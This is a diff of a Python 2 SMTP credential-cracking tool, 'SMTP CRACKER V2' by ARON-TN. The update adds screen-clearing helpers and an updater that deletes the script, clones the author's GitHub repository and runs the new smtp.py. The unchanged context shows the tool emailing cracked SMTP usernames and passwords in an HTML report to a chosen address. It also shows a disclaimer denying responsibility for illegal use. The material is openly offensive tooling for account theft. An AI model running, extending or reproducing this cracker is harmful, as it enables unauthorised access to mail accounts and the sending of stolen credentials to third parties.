@@ -4,8 +4,16 @@
 #Don't Change copyright Mother Fucker :)
 #Tunisia Coderz
 #Tool Finished In : 01:22 10/03/2019
+#last Update in : 12:06 17/03/2019
 import os,socket,threading,base64,datetime,sys,ssl,imaplib,time,re
-msg0 ="\n\033[91m########## verified Your modules ########"
+try:
+  if os.name=='nt':
+   os.system('cls')
+  else:
+   os.system('clear')
+except:
+    print("\033[91mERROR :| \nConatct ARON-TN AS u LIKE !\033[00m")
+msg0 ="\033[91m########## verified Your modules ########"
 for i in msg0:
         sys.stdout.write(i)
         sys.stdout.flush()
@@ -67,11 +75,29 @@ except:
       raw_input('')
   else:
     os.system('pip2 install colorama')
-msg00 ="\n\033[91m##### GOOd Now You have all modules #####\n############## Let's start ##############"
+msg00 ="\n\033[92m##### GOOd Now You have all modules #####\n\033[0;96m############## Let's start ##############\033[92m\n"
 for i in msg00:
         sys.stdout.write(i)
         sys.stdout.flush()
         time.sleep(0.1)
+def hello():
+ try:
+  if os.name=='nt':
+   os.system('cls')
+  else:
+   os.system('clear')
+ except:
+    print("\033[91mERROR :| \nConatct ARON-TN AS u LIKE !\033[00m")
+def aron():
+ try:
+  if os.name=='nt':
+   hello()
+   os.system('cd SMTP-Mail.acess-Cracker-Checker && smtp.py')
+  else:
+   hello()
+   os.system('cd SMTP-Mail.acess-Cracker-Checker && python2 smtp.py')
+ except:
+    print("\033[91mERROR :| \nConatct ARON-TN AS u LIKE !\033[00m")
 to_check={}
 print '\033[1m'
 class IMAP4_SSL(imaplib.IMAP4_SSL):
@@ -359,7 +385,7 @@ class consumer(threading.Thread):
 				s.close()
 				return self.addBad(host1)
 			rez=self.sendCmd(s,'DATA')
-			headers='From: 👻 SMTP CRACKER V2 👻 <'+user+'> \r\n'
+			headers='From: ðŸ‘» SMTP CRACKER V2 ðŸ‘» <'+user+'> \r\n'
 			headers+='To: '+email+'\r\n'
 			headers+='Subject:New Smtp Result By ARON-TN\r\n'
 			headers+='MIME-Version: 1.0\r\n'
@@ -391,7 +417,7 @@ background: -o-linear-gradient(green,#F3431D,green);
   User  : '''+user+'''<br>
   Password  : '''+passw+'''<br><br><font color="blue"> /!\ WARNING /!\ <br> i don't accept any responsibility for any illegal usage !</font><br><br>
   Contact Coder(ARON-TN)  <br>  Email : aron.tn.official@gmail.com<br>  Facebook : <a href="https://www.facebook.com/amir.othman.official">Click HEre</a><br>
-  Youtube : <a href="https://www.youtube.com/channel/UCuk4DSWDGxdZnHbrqVz0ZZA">Click HEre</a><br><font>� ARON-TN 2017-2019</font></b></body></html>'''
+  Youtube : <a href="https://www.youtube.com/channel/UCuk4DSWDGxdZnHbrqVz0ZZA">Click HEre</a><br><font>© ARON-TN 2017-2019</font></b></body></html>'''
 			s.send(headers)
 			rez=s.recv(1000)
 			self.sendCmd(s,'QUIT')
@@ -439,19 +465,25 @@ except:
  for i in ms0g:
         sys.stdout.write(i)
         sys.stdout.flush()
-        time.sleep(0.1)
+        time.sleep(0.02)
  vers=requests.get('https://gist.githubusercontent.com/aron-tn/edecab7db5849e16fc9c77ad14eba0b3/raw/aaec54e2fa507c3afde04e2551cb639e3aaa7c03/gistfile1.txt').text.encode('utf-8')
- if vers=='ARON-TN@2.0@ARON-TN':
-  print('\033[91mG\033[94mo\033[92mo\033[91md \033[94mY\033[92mo\033[91mu\033[94m H\033[92ma\033[92mv\033[91me\033[94m L\033[92ma\033[91ms\033[94mt\033[92m V\033[91me\033[94mr\033[92ms\033[91mi\033[94mo\033[92mn\033[91m \n')
+ if vers=='ARON-TN@2.1@ARON-TN':
+  print('\033[91m{\033[94m>\033[91m} \033[91mG\033[94mo\033[92mo\033[91md \033[94mY\033[92mo\033[91mu\033[94m H\033[92ma\033[92mv\033[91me\033[94m L\033[92ma\033[91ms\033[94mt\033[92m V\033[91me\033[94mr\033[92ms\033[91mi\033[94mo\033[92mn\033[91m \n')
  else:
-  print("\033[91mThere IS NEW Version\033[94m :\ \033[92mDo you Want To Update it ? \033[00m")
+  print("\033[91mThere IS NEW Update\033[94m :\ \033[92mDo you Want To Download it ? \033[00m")
   ok=raw_input('''
   \033[91m[\033[94m1\033[91m]\033[00m YEs
   \033[91m[\033[94m2\033[91m]\033[00m No
  \033[91m[\033[94m>\033[91m]\033[00m : ''')
   if ok=='1':
+   aroon ="\n\033[91m[\033[94m*\033[91m]\033[00m Thanks <3\n"
+   for i in aroon:
+        sys.stdout.write(i)
+        sys.stdout.flush()
+        time.sleep(0.1)
    os.remove(sys.argv[0])
-   os.system('git clone https://github.com/aron-tn/SMTP-Mail.acess-Cracker-Checker && cd SMTP-Mail.acess-Cracker-Checker && python2 smtp.py')
+   os.system('git clone https://github.com/aron-tn/SMTP-Mail.acess-Cracker-Checker')
+   aron()
   elif ok=='2':
    pass
  try:
